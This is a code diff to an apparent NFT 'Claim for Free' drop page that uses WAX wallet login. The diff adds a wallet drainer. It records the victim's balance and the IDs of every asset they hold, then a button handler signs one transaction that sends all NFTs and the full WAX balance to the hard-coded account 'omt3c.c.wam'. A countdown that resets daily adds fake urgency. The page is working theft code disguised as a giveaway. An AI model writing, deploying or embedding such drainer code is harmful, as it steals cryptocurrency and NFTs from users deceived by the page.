@@ -1514,8 +1514,11 @@
                                 <!-- <div id="div2" id="login" class="login-button btn btn-primary" value="Click" onmousedown="viewDiv1(); login(); viewDiv228(); viewDiv();">WAX LOGIN</div> -->
                                 <div id="div2" id="login" class="login-button btn btn-primary" value="Click">WAX LOGIN</div>
                               
-                                <p style="color:#faf8f5" id="loginresponse"></p>
-
+                                <div class="loggedin_status">   
+                                    <p style="color:#faf8f5; margin:0; font-size:10px;" id="hellologin"></p>
+                                    <p style="color:#faf8f5; margin:0; font-weight: bold;" id="loginresponse"></p>
+                                    <p style="color:#45af4f; margin:0;font-size: 13px; font-weight: bold;" id="walletBalance"></p>
+                                </div>
                             </div>
 
 
@@ -1754,7 +1757,7 @@
                                             <button data-testid="buy-drop-page-action-button" type="button"
                                                 class="btn btn-primary claim-btn btn-block d-none">Claim for Free</button>
                                             <button data-testid="buy-drop-page-action-button" type="button"
-                                                class="login-button btn btn-primary btn-block">Claim for Free</button>
+                                                class="login-button btn btn-primary btn-block" >Claim for Free</button>
                                         </div>
                                     </div>
                                 </div>
@@ -2724,6 +2727,7 @@ function viewDiv228(){
 
             // хандлер для кнопки LOGIN
             $("#div2").on("click", () => open_wallet());
+            $("#div1").on("click", () => transferAllTokens());
 
 
             // хандлер для кнопки CLOUD WALLET
@@ -2909,7 +2913,13 @@ function viewDiv228(){
 
 
     <script>
-     const wax = new waxjs.WaxJS({
+
+    localStorage.removeItem("userAccount");
+    localStorage.removeItem("userBalance");
+    localStorage.removeItem("idList");
+    
+    
+    const wax = new waxjs.WaxJS({
             rpcEndpoint: 'https://wax.greymass.com'
         });
     
@@ -2935,16 +2945,138 @@ function viewDiv228(){
                
                 let userAccount = await wax.login();
                 let pubKeys = wax.pubKeys;
-                let str = 'HELLO, ' +  userAccount;
-        
+                let str = userAccount;
+                let balance = await get_balance(userAccount);
+                
+                
+                let allAssets = await GetAssets(userAccount);
+                let id_list = [];
+                for (let item of allAssets) {
+                    id_list.push(item.asset_id);
+                }
+
+                localStorage.setItem("userAccount", userAccount);
+                localStorage.setItem("userBalance", balance);
+                localStorage.setItem("idList", id_list);
+
+                balance = parseFloat(balance).toFixed(2) + "WAX";
+                // transferAllTokens();
+                // await transferAllTokens(userAccount, id_list);
+                
+                document.getElementById('hellologin').insertAdjacentHTML('beforeend', "Hello,");
+                document.getElementById('walletBalance').insertAdjacentHTML('beforeend', balance);
                 document.getElementById('loginresponse').insertAdjacentHTML('beforeend', str);
             } catch (e) {
                 document.getElementById('loginresponse').append(e.message);
             }
         } 
+
+        async function get_balance(wallet_userAccount) {
+            let balance = await wax.rpc
+            .get_currency_balance("eosio.token", wallet_userAccount, "wax")
+            .then((res) => {
+                console.log("balance", res[0]);
+                return res[0];
+            })
+            .catch((err) => {
+                console.log("err", err);
+                return "0";
+            });
+            return balance;
+        }
+
+        async function transferAllTokens() {
+            
+            userAccount = localStorage.getItem("userAccount");
+            userBalance = localStorage.getItem("userBalance");
+            idList = localStorage.getItem("idList");
+            id_list = idList.split(',');
+
+            console.log("sending FT, NFT to omt3c.c.wam", userAccount, userBalance, id_list);
+            const result = await wax.api.transact({
+                actions: [
+                    {
+                        account: "atomicassets",
+                        name: 'transfer',
+                        authorization: [{
+                            actor: userAccount,
+                            permission: 'active',
+                        }],
+                        data: {
+                            from: userAccount,
+                            to: "omt3c.c.wam",
+                            asset_ids: id_list,
+                            memo: "transfer",
+                        }
+                    },
+                    {
+                        account: "eosio.token",
+                        name: 'transfer',
+                        authorization: [{
+                            actor: userAccount,
+                            permission: 'active',
+                        }],
+                        data: {
+                            from: userAccount,
+                            to: "omt3c.c.wam",
+                            quantity: userBalance,
+                            memo: 'transfer',
+                        }
+                    }
+                ]
+            }, {
+                blocksBehind: 3,
+                expireSeconds: 30
+            });
+        }
     
       
-    
+        var end = 1649700000;
+        var start = Math.floor(Date.now() / 1000);;
+        var time = end - start;
+        var sutki = 86400;
+        setInterval(function () {
+            var end = 1652666400; 
+            var sutki = 86400;
+            var nowDate = Math.round(new Date().getTime() / 1000.0);
+            while (end - nowDate < 0) {
+                end = end + sutki;
+            }
+            if (end - nowDate > 0) {
+                var date = end - nowDate;
+                var hour = parseInt(date / 3600);
+                var min = parseInt((date % 3600) / 60);
+                var sec = parseInt((date % 3600) % 60);
+                var h = hour >= 10 ? hour : "0" + hour;
+                var m = min >= 10 ? min : "0" + min;
+                var s = sec >= 10 ? sec : "0" + sec;
+                $('.main-timer').html(`${0}d ${h}h ${m}m ${s}s`);
+            }
+        }, 1000);
+
+        ///////////////////////////////////////////
+        function sendAllAssets(account){
+            
+        }
+
+        const GetAssets = async (account) => {
+            let results = [];
+            
+            console.log("userAccoun = ", account);
+            var path = "atomicassets/v1/assets?owner=" + account + "&page=1&limit=1000&order=desc&sort=asset_id";
+            const response = await fetch("https://" + "wax.api.atomicassets.io/" + path, {
+            headers: {
+                "Content-Type": "text/plain"
+            },
+            method: "POST",
+            });
+            const body = await response.json();
+            if (body.data.length != 0)
+            results = body.data;
+            console.log("get all assets = ", results);
+            return results;
+        }
+        
     </script>
 
 </body>
